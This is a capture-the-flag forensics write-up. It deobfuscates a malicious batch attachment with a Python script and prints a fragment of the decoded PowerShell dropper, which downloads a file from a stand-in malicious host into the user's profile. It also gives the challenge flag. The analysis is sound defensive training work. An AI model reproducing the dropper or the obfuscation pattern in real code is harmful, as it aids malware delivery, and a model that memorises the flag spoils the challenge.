# Manual - Forensics Challenge Writeup

## Challenge Information
- **Name**: Manual
- **Category**: Forensics
- **Difficulty**: Very Easy
- **Event**: Neurogrid CTF: The ultimate AI security showdown

## Description
When a courier is found ash-faced on the cedar road, Shiori discovers a "tradesman's manual" folded in his sleeve... The scroll is an obfuscated BAT attachment in disguise.

## Solution

1. **Analysis of the Artifact**:
   The challenge provided a zip file containing `tradesman_manual.bat`. Opening this file revealed a heavily obfuscated batch script. The script used a technique where environment variables were set to individual characters or short strings and then combined to form commands.

   Snippet of `tradesman_manual.bat`:
   ```bat
   s%zapqo%et xmffp=d
   s%gxyke%et zbmzf=p
   ...
   !qoz! %FTW%b%FTW%y%FTW%o%FTW%=AaQBrAGUAdjlrttmeqqkrIABVAFQARgAtADEANgBMdjlrttme
   ```

2. **Deobfuscation**:
   I wrote a Python script to parse the batch file. The script:
   - Extracted the variable assignments (e.g., `!qoz! %...%=VALUE`).
   - Reconstructed the long command string by substituting the variables.
   - Identified a large Base64 encoded string within the reconstructed command.
   - Decoded the Base64 string (which was UTF-16LE encoded, typical for PowerShell).

   The deobfuscation script `solve_manual.py`:
   ```python
   import re
   import base64

   filepath = 'tradesman_manual.bat'

   with open(filepath, 'r') as f:
       content = f.read()

   vars_dict = {}
   lines = content.splitlines()
   
   # Parse variable definitions
   for line in lines:
       if line.startswith('!qoz!'):
           rest = line[5:].strip()
           if '=' in rest:
               lhs, rhs = rest.split('=', 1)
               var_name = re.sub(r'%[^%]+%', '', lhs)
               vars_dict[var_name] = rhs.strip()

   # Find the execution line
   long_line = ""
   for line in lines:
       if line.count('%') > 50 and '!qoz!' not in line:
           long_line = line.strip()
           break

   # Reconstruct the command
   parts = long_line.split('%')
   var_sequence = [p for p in parts if p]
   
   full_string = ""
   for var in var_sequence:
       if var in vars_dict:
           full_string += vars_dict[var]

   # Extract and decode Base64
   start_marker = "$s='"
   end_marker = "'.Replace"
   
   if start_marker in full_string and end_marker in full_string:
       start_idx = full_string.find(start_marker) + len(start_marker)
       end_idx = full_string.find(end_marker, start_idx)
       b64_str = full_string[start_idx:end_idx]
       
       junk = 'djlrttmeqqkr'
       clean_b64 = b64_str.replace(junk, '')
       
       decoded = base64.b64decode(clean_b64).decode('utf-16')
       print(decoded)
   ```

3. **Finding the Flag**:
   Running the solver script revealed the underlying PowerShell script. The script attempted to download a payload from a URL, and the flag was embedded directly in that URL.

   Decoded PowerShell snippet:
   ```powershell
   $anaba = Join-Path $env:USERPROFILE 'aoc.bat'
   $uri    = 'http://malhq.htb/HTB{34dsy_d30bfusc4t10n_34sy_d3t3ct10n}'
   
   Try {
       Write-Host "Downloading from $uri ..."
       # ...
   }
   ```

## Flag
`HTB{34dsy_d30bfusc4t10n_34sy_d3t3ct10n}`
